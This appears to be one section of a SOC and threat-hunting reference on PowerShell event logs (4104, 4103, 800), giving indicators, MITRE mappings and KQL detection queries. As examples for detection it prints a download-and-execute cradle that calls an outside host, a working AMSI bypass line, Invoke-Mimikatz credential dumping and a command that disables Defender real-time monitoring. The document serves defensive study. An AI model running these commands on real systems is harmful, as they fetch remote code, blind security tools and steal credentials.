# **Section 3 — PowerShell Logs**
_Comprehensive SOC, DFIR & Threat Hunting Reference_

PowerShell is one of the most abused tools by attackers on Windows systems.  
Modern ransomware, phishing payloads, red-team tools, and living-off-the-land attacks
ALL rely heavily on PowerShell.

Windows provides three critical logging mechanisms:

1. **4104 — ScriptBlock Logging** (full de-obfuscated script content)  
2. **4103 — Module Logging** (modules loaded, commands invoked)  
3. **800 — PowerShell Operational** (pipeline execution events)

These logs are essential for detecting PowerShell-based malware and post-exploitation.

---

# 🧭 **TABLE OF CONTENTS**
- [Overview of PowerShell Logging](#-overview-of-powershell-logging)
- [Event ID 4104 — ScriptBlock Logging](#-event-id-4104--scriptblock-logging)
- [Event ID 4103 — Module Logging](#-event-id-4103--module-logging)
- [Event ID 800 — PowerShell Operational](#-event-id-800--powershell-operational-logging)
- [Common Malicious PowerShell Patterns](#-common-malicious-powershell-patterns)
- [Detection Strategies](#-detection-strategies)
- [SIEM Queries](#-siem-queries)

---

# ---
# ## **Overview of PowerShell Logging**
PowerShell is a *post-exploitation super-tool* abused for:

- Downloading payloads  
- Executing encoded commands  
- In-memory malware loading  
- Credential dumping  
- Lateral movement (WinRM, WMI, PSRemoting)  
- Evasion and obfuscation  

**Key fact:**  
PowerShell logs often reveal *exact attacker intent*, even when commands were obfuscated.

---

# ---
# ## **Event ID 4104 — ScriptBlock Logging**
### **Meaning**
Logs **full PowerShell scripts**, including:
- decoded Base64 content  
- de-obfuscated commands  
- in-memory execution  

4104 is the **single most valuable PowerShell log**.

### **Why It Matters**
Captures:
- malicious downloads  
- AMSI bypass techniques  
- invoke-obfuscation payloads  
- Cobalt Strike / Empire scripts  
- ransomware staging  

### **MITRE ATT&CK**
- **T1059.001 — PowerShell**
- **T1059 — Command Execution**
- **T1086 — PowerShell-based execution**

### **Real Attacker Example**
```
EventID: 4104
Message:
IEX (New-Object Net.WebClient).DownloadString('http://185.199.110.33/payload.ps1')
```

### **What to Look For**
- `IEX` (Invoke-Expression)
- `DownloadString`, `DownloadFile`
- `$client = New-Object Net.WebClient`
- `Invoke-WebRequest`
- `.FromBase64String()`
- Encoded commands:
  - `powershell -enc AAAABBBBCCC...`

### **High-Risk Indicators**
| Indicator | Meaning |
|----------|---------|
| `-nop` | no profile → stealth execution |
| `-w hidden` | hidden window |
| `IEX` | execution of downloaded script |
| Base64 payloads | obfuscation |
| AMSI bypass strings (`amsiutils`, `amsiInitFailed`) | evasion |

---

# ---
# ## **Event ID 4103 — Module Logging**
### **Meaning**
Logs PowerShell modules and commands executed within them.

### **Why It Matters**
Reveals attacker actions such as:
- AD enumeration (ActiveDirectory module)  
- Networking (NetTCPIP module)  
- WMI module abuse  
- Execution of system admin cmdlets  

### **MITRE ATT&CK**
- **T1087 — Account Discovery**
- **T1049 — Network Discovery**
- **T1482 — Domain Trust Discovery**

### **Real Attacker Example**
```
ModuleName: ActiveDirectory
Command: Get-ADUser -Filter *
```

### **Suspicious Commands**
- `Get-ADUser`, `Get-ADGroup`
- `Get-LocalUser`
- `Get-SmbConnection`
- `Invoke-WMIMethod`
- `Get-Process lsass`

### **Red Flags**
- AD enumeration from non-admin workstations  
- WMI commands run by regular users  
- Widespread system reconnaissance  

---

# ---
# ## **Event ID 800 — PowerShell Operational Logging**
### **Meaning**
Logs details about the PowerShell **pipeline execution**.

### **Why It Matters**
Catches:
- AMSI bypass attempts  
- Script execution errors  
- Reconstructed pipeline steps (even when obfuscated)  

### **MITRE ATT&CK**
- **T1059.001 — PowerShell**

### **Real Example**
```
EventID: 800
Message:
Pipeline execution details for command line: powershell -nop -w hidden ...
```

### **Red Flags**
- Pipeline errors caused by malformed malware  
- Execution of hidden/encoded scripts  
- Loading suspicious modules  

---

# ---
# ## **Common Malicious PowerShell Patterns**
Attackers often use recognizable patterns.

### **1️⃣ Encoded Commands**
```
powershell.exe -nop -w hidden -enc SQBtAHAAbwByAHQALQ...
```

### **2️⃣ Download & Execute**
```
IEX (New-Object Net.WebClient).DownloadString('http://malicious/payload.ps1')
```

### **3️⃣ Invoke-Mimikatz**
```
Invoke-Mimikatz -DumpCreds
```

### **4️⃣ AMSI Bypass**
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### **5️⃣ Living-Off-The-Land PowerShell**
```
Get-WmiObject Win32_Process
Invoke-Command -ComputerName target
Set-MpPreference -DisableRealtimeMonitoring $true
```

---

# ---
# ## **Detection Strategies**

### **Detect Obfuscation**
- Base64  
- string concatenation  
- `char[]` → joined strings  
- reversible encoding  
- backtick escaping  

### **Detect Network Activity**
- Downloads via WebClient  
- Invoke-WebRequest  
- unusual User-Agents  

### **Detect Reconnaissance**
- AD enumeration from endpoints  
- domain discovery commands  

### **Detect AMSI Bypass**
Keywords:
- AmsiUtils  
- amsiInitFailed  
- AntiMalware  

### **Detect Credential Access**
- LSASS targeting  
- Invoke-Mimikatz  
- DPAPI decryption  

---

# ---
# ## **SIEM Queries**

### **KQL — Suspicious PowerShell Execution**
```kql
PowerShellEvent
| where EventID == 4104
| where Message has_any ("DownloadString","IEX","FromBase64String","-enc")
```

### **KQL — AD Enumeration from Workstation**
```kql
PowerShellEvent
| where EventID == 4103
| where Command has_any ("Get-ADUser","Get-ADGroup","Get-ADComputer")
| where Computer !contains "DC"
```

### **KQL — AMSI Bypass Detection**
```kql
PowerShellEvent
| where EventID == 4104
| where Message has_any ("AmsiUtils", "amsiInitFailed")
```

---

# 🎯 **End of Section 3**
This section provides full detection coverage for malicious PowerShell activity across all major attack techniques.

Next:  
➡️ **Section 4 — Windows Defender Logs**
